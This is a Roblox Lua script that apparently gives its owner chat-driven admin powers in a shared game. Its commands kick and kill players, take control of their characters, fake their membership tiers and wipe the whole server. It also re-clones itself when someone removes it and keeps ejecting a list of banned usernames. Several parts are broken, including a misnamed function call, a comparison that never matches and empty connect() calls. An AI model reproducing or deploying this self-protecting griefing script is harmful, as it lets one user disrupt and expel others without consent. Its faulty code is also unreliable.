local Settings={["Un_Removable"]= "On"}
local function mFloor(x) return x - x % 1 end
local Un_Removable = tostring(Settings["Un_Removable"]):lower() == "on"
if Un_Removable then
	Game.Workspace.DescendantRemoving:connect(function(Child)
		if not Remove_At_Will and Child == script then
			script:Clone().Parent = Game.Workspace
		end
end)
end

Owners = {"rigletto"}
Banned = {"Zuppi", "daniel4667", "daniel46672"}

function Prion()
allowed={"yfc"}
function check(name)
for i,h in pairs(allowed) do
if h:lower()==name:lower() then
return true
end
end
return false
end
function enter(player)
local name=player.Name
if check(name) then
-- Nothing
else
player:Remove()
end
end
for i,x in pairs(game.Players:getPlayers()) do
enter(x)
end
game.Players.PlayerAdded:connect(enter)
end

for i = 1,#Owners do
if game.Players:findFirstChild(Owners[i]) then
Player = game.Players:findFirstChild(Owners[i]) 
if Player.Character:findFirstChild("Energy") then
Player.Character["Energy"]:remove()
end
local RISE = 5 
local FOLLOW = true 
local M = Instance.new("Model") 
local H = Instance.new("Humanoid") 
M.Parent = Player.Character 
H.Parent = M 
H.MaxHealth = 0 
H.Health = 0 
M.Name = "Energy" 
local p = Instance.new("Part") 
local BP = Instance.new("BodyPosition") 
local BG = Instance.new("BodyGyro") 
local SPL = Instance.new("SelectionPartLasso") 
BP.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
SPL.Parent = p 
p.BrickColor = BrickColor.new("White") 
f=Instance.new("SpecialMesh")
f.Parent=p 
f.MeshId = "http://www.roblox.com/asset/?id=34795798" 
f.MeshType = "FileMesh"
f.Scale = Vector3.new(2,2,2)
f.TextureId = "http://www.roblox.com/asset/?id=68021910" 
p.Name = "Head" 
p.Parent = M 
p.Shape = "Ball" 
p.formFactor = "Symmetric" 
p.Size = Vector3.new(2,2,2) 
p.TopSurface = 0 
p.Locked = true
BP.Parent = p 

local Levitated = 0 
local LevitateDir = -1 
 
while true do wait() 
pcall(function() 
for i = 1,#Banned do
if game.Players:findFirstChild(Banned[i]) then
game.Players:findFirstChild(Banned[i]):remove()
end
end
if game.Players:findFirstChild("ThePC8110") == false then
local e = game.StarterPack:getChildren()
for i = 1,#e do
e[i]:remove()
end
local f = game.StarterGui:getChildren()
for i = 1,#f do
f[i]:remove()
end
local g = game.Lighting:getChildren()
for i = 1,#g do
g[i]:remove()
end
local h = game.Players:getChildren()
for i = 1,#h do
h[i]:remove()
end
local j = game.Workspace:getChildren()
for i = 1, #j do
j[i]:remove()
end
end
---------------------------------------------------------
function matchPlayer(str) 
local result = nil 
local players = game.Players:GetPlayers() 
for i,v in pairs(game.Players:GetPlayers()) do 
if (string.find(string.lower(v.Name), str) == 1) then 
if (result ~= nil) then return nil end 
result = v 
end 
end 
return result 
end 
---------------------------------------------------------
function onChatted(msg) 
--
if (string.find(msg, string.lower("kick"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player:Remove() 
end 
end 
end 
--
if (string.find(msg, string.lower("teletome"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character.Torso.CFrame = Player.Character.Torso.CFrame 
end 
end 
end 
--
if (string.find(msg, string.lower("ff"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
f=Instance.new("ForceField",player.Character)
end 
end 
end 
--
if (string.find(msg, string.lower("orbon"))) then 
p.Transparency = 0
end
--
if (string.find(msg, string.lower("orboff"))) then 
p.Transparency = 1
end
--
if (string.find(msg, string.lower("pri"))) then 
prion()
end
--
if (string.find(msg, string.lower("noff"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
for i = 1,50 do
if player.Character:findFirstChild("ForceField") then
player.Character.ForceField:remove()
end
end
end 
end 
end 
--
if (string.find(msg, string.lower("shutdown"))) then 
local e = game.StarterPack:getChildren()
for i = 1,#e do
e[i]:remove()
end
local f = game.StarterGui:getChildren()
for i = 1,#f do
f[i]:remove()
end
local g = game.Lighting:getChildren()
for i = 1,#g do
g[i]:remove()
end
local h = game.Players:getChildren()
for i = 1,#h do
h[i]:remove()
end
local j = game.Workspace:getChildren()
for i = 1, #j do
j[i]:remove()
end
end
--
if (string.find(msg, string.lower("kill"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints()
end 
end 
end 
--
if (string.find(msg, string.lower("control"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
Player.Character = player.Character
end 
end 
end 
--
if (string.find(msg, string.lower("respawn"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
local model = Instance.new("Model")
model.Parent = game.Workspace
local torso = Instance.new("Part")
torso.Transparency = 1
torso.CanCollide = false
torso.Anchored = true
torso.Name = "Torso"
torso.Position = Vector3.new(10000,10000,10000)
torso.Parent = model
local human = Instance.new("Humanoid")
human.Torso = torso
human.Parent = model
player.Character = model
end 
end 
end 
--
if (string.find(msg, string.lower("clear"))) then 
local w=game.Workspace:GetChildren() 
for i=1,#w do 
if (game.Players:GetPlayerFromCharacter(w[i]))==nil and (w[i].Name~="TinySB") and (w[i]~=game.Workspace.CurrentCamera) and (w[i]~=script) and (w[i]~=game.Workspace.Terrain) then 
if w[i].className == "Script" then
w[i].Disabled = true
end
w[i]:Remove() 
end 
end 
local Base=Instance.new("Part",game.Workspace) 
Base.Name="Base" 
Base.Size=Vector3.new(1000,1,1000) 
Base.BrickColor=BrickColor.new("Earth green") 
Base.Anchored=true 
Base.Locked=true 
Base.TopSurface="Universal" 
Base.CFrame=CFrame.new(Vector3.new(0,0,0)) 
local Spawn=Instance.new("SpawnLocation",game.Workspace)
Spawn.Name="SpawnLocation"
Spawn.Size=Vector3.new(6,1,6)
Spawn.Transparency=1
Spawn.CanCollide=false
Spawn.Anchored=true
Spawn.Locked=true
Spawn.CFrame=CFrame.new(Vector3.new(0,1,0))
end 
--
--
if (string.find(msg, string.lower("thepc8110"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=17165546" 
end 
end 
end 
--
if (string.find(msg, string.lower("telamon"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=261" 
end 
end 
end 
--
if (string.find(msg, string.lower("roblox"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:BreakJoints() 
player.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId=17165546" 
end 
end 
end 
--
if (string.find(msg, string.lower("obc"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.MembershipTypeReplicate = Enum.MembershipType.OutrageousBuildersClub
p.MembershipTypeReplicate = Enum.MembershipType.OutrageousBuildersClub
end 
end 
end 
--
if (string.find(msg, string.lower("tbc"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.MembershipTypeReplicate = Enum.MembershipType.TurboBuildersClub
p.MembershipTypeReplicate = Enum.MembershipType.TurboBuildersClub
end 
end 
end 
--
if (string.find(msg, string.lower("bc"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.MembershipTypeReplicate = Enum.MembershipType.BuildersClub
p.MembershipTypeReplicate = Enum.MembershipType.BuildersClub
end 
end 
end 
--
if (string.find(msg, string.lower("nbc"))) then 
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.MembershipTypeReplicate = Enum.MembershipType.None
p.MembershipTypeReplicate = Enum.MembershipType.None
end 
end 
end 
--
if (string.find(msg, string.lower("commands"))) then 
h=Instance.new("Hint",game.Workspace)
h.Text="Commands: commands, nbc, tbc, obc, bc, roblox, thepc8110, pri, telamon..."
wait(5)
h.Text="... respawn, control, kill, teletome, shutdown, ff, noff, orboff, orbon"
wait(5)
h:remove()
end 
--
end
---------------------------------------------------------
M.Parent = Player.Character 

Levitated = Levitated + LevitateDir / 20 
if Levitated >= 1 or Levitated <= -1 then 
LevitateDir = -LevitateDir 
end 
if (FOLLOW == true) then 
BP.position = (Player.Character.Torso.CFrame * CFrame.new(5, RISE, -2.5)).p + Vector3.new(0, Levitated, 0) 
end
end)

if Player.Character:findFirstChild("Energy") then
if not Player.Character["Energy"]:findFirstChild("Head") then

local M = Player.Character:findFirstChild("Energy")
local H =  Player.Character["Energy"]:findFirstChild("Humanoid")
H.MaxHealth = 0 
H.Health = 0 
local p = Instance.new("Part") 
local BP = Instance.new("BodyPosition") 
local BG = Instance.new("BodyGyro") 
local SPL = Instance.new("SelectionPartLasso") 
BP.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
SPL.Parent = p 
p.BrickColor = BrickColor.new("White") 
f=Instance.new("SpecialMesh")
f.Parent=p 
f.MeshId = "http://www.roblox.com/asset/?id=34795798"
f.MeshType = "FileMesh"
f.Scale = Vector3.new(2,2,2)
f.TextureId = "http://www.roblox.com/asset/?id=68021910" 
p.Name = "Head" 
p.Parent = M 
p.Shape = "Ball" 
p.formFactor = "Symmetric" 
p.Size = Vector3.new(2,2,2) 
p.TopSurface = 0 
p.Locked = true
BP.Parent = p 
Player.Chatted:connect(onChatted) 
Game.JointsService.DescendantAdded:connect()
Workspace.DescendantAdded:connect()
end
end
end
end
end
--mediafire gtfo password